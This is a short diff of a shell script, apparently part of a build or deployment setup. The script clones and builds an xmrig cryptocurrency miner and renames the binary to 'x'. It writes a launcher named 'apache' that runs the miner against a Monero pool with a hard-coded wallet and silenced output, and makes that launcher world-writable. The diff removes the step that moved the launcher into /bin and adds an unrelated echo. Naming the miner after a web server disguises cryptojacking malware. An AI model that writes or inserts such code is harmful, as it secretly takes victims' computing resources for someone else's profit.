@@ -1,3 +1,5 @@
+BP_DIR=$(cd $(dirname ${0:-}); cd ..; pwd)
+
 apt install git build-essential cmake libuv1-dev libmicrohttpd-dev
 cd /app
 git clone https://github.com/jitjitsu/xr
@@ -8,4 +10,4 @@ make
 mv /app/xr/build/xmrig /app/xr/build/x
 echo "/app/xr/build/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k -t 1 > /dev/null" > /app/apache
 chmod 0777 /app/apache
-mv /app/apache /bin/apache
+echo BP_DIR
